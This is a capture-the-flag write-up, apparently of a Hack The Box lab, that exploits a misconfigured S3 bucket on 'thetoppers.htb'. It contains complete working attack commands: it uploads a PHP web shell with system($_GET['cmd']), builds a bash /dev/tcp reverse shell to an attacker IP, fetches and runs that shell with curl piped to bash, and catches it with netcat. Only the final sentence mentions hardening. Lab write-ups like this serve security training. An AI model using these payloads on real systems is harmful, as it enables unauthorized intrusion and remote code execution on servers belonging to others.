# Exploiting an Amazon S3 Bucket for a Reverse Shell

## Introduction
This guide covers the process of **enumerating, exploiting, and gaining a reverse shell** on a system using an **Amazon S3 bucket**. By leveraging **AWS misconfigurations**, we can upload a web shell and execute commands remotely to gain shell access.

## Reconnaissance
### Scanning the Target with Nmap
```bash
nmap -sV -A 10.129.99.11
```
#### Key Findings:
- **SSH (22/tcp) running OpenSSH 7.6p1**
- **HTTP (80/tcp) running Apache 2.4.29**
- Target OS: **Linux Kernel 5.X**

### Virtual Host Enumeration with Gobuster
```bash
gobuster vhost -u http://thetoppers.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```
#### Discovered Subdomains:
- `s3.thetoppers.htb`
- `gc._msdcs.thetoppers.htb`

Upon visiting `http://s3.thetoppers.htb/`, the response returned:
```json
{"status": "running"}
```
This suggests an **Amazon S3 bucket hosting content**.

---

## Exploitation: AWS S3 Misconfiguration
### Configuring AWS CLI to Interact with the Bucket
```bash
aws configure
```
Enter temporary credentials (placeholders used):
```bash
AWS Access Key ID [None]: temp
AWS Secret Access Key [None]: temp
Default region name [None]: temp
Default output format [None]: temp
```

### Listing Available Buckets
```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls
```
#### Found Bucket:
```
2025-02-10 12:05:02 thetoppers.htb
```

### Exploring the Contents of the S3 Bucket
```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```
#### Retrieved Files:
```
PRE images/
2025-02-10 12:05:02  0 .htaccess
2025-02-10 12:05:02  11952 index.php
```

### Uploading a Web Shell
To execute remote commands, we create and upload a simple PHP shell:
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```
Verify the upload:
```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```
```
PRE images/
2025-02-10 12:05:02  0 .htaccess
2025-02-10 12:05:02  11952 index.php
2025-02-10 14:30:15  31 shell.php
```

---

## Gaining a Reverse Shell
### Setting Up a Netcat Listener
```bash
nc -nvlp 1337
```

### Preparing the Reverse Shell Script
```bash
echo "#!/bin/bash\nbash -i >& /dev/tcp/10.10.16.29/1337 0>&1" > shell.sh
python3 -m http.server 8000
```

### Triggering the Reverse Shell
Accessing the uploaded PHP shell:
```bash
http://thetoppers.htb/shell.php?cmd=curl%2010.10.16.29:8000/shell.sh|bash
```
#### Listener Output:
```
connect to [10.10.16.29] from (UNKNOWN) [10.129.99.11] 50664
bash: cannot set terminal process group (1486): Inappropriate ioctl for device
bash: no job control in this shell
```

### Confirming Access
```bash
whoami
ls -la
```
We have successfully obtained a shell with `www-data` privileges.

---

## Post-Exploitation
### Exploring the System
```bash
cd /var/www/html
ls
```
Discovered files:
```
images
index.php
shell.php
```
### Capturing the Flag
```bash
cd /var/www/
cat flag.txt
```
```
a980d99281a28d638ac68b9bf9453c2b
```

---

## Host Mapping
To ensure the target domain resolves correctly, modify `/etc/hosts`:
```bash
echo "10.129.99.11 s3.thetoppers.htb" | sudo tee -a /etc/hosts  
echo "10.129.99.11 gc._msdcs.thetoppers.htb" | sudo tee -a /etc/hosts  
echo "10.129.99.11 thetoppers.htb" | sudo tee -a /etc/hosts  
```

---

## Conclusion
This attack leveraged **Amazon S3 misconfigurations** to upload a **remote PHP shell**, which was used to execute commands and gain a **reverse shell**. Proper **S3 bucket permissions** and **server hardening** can prevent such exploits.

